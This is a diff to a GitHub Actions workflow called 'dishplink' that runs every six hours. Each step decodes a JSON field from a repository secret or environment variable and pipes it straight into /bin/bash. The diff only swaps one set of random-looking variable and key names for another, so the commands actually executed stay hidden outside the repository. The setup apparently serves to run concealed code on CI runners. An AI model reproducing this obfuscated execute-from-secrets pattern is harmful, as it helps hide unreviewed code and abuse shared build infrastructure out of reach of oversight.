@@ -2,25 +2,21 @@ name: dishplink
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 5/6 * * *'
-jobs:  # 8284
+    - cron: '27 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dishplink
         env:
-          i34: ${{ secrets.i34 }}
+          f8750: ${{ secrets.f8750 }}
         run: |
-          echo $i34 | jq -r .p3739 | /bin/bash
-          echo $fgxk898 | jq -r .t4 | /bin/bash
-          echo $xi8 | jq -r .wca99 | /bin/bash
-          echo $ncyl360 | jq -r .dt5988 | /bin/bash
-          echo $x9 | jq -r .wsqdy18 | /bin/bash
-          echo $lo3675 | jq -r .bgxo8 | /bin/bash
-          echo $jrq78099 | jq -r .uaik9544 | /bin/bash
-          echo $ydv348 | jq -r .kyed64561 | /bin/bash
-          echo $rvff472 | jq -r .qo2 | /bin/bash
-          echo $fl55651 | jq -r .pvp202 | /bin/bash
+          echo $f8750 | jq -r .is8 | /bin/bash
+          echo $fbl8635 | jq -r .s62378 | /bin/bash
+          echo $sr60 | jq -r .ir913 | /bin/bash
+          echo $fjrl891 | jq -r .eqqwi6 | /bin/bash
+          echo $ahgod48 | jq -r .cwt54 | /bin/bash
+          echo $kr0316 | jq -r .lda1259 | /bin/bash
+          echo $ytyf6 | jq -r .z0336 | /bin/bash
 
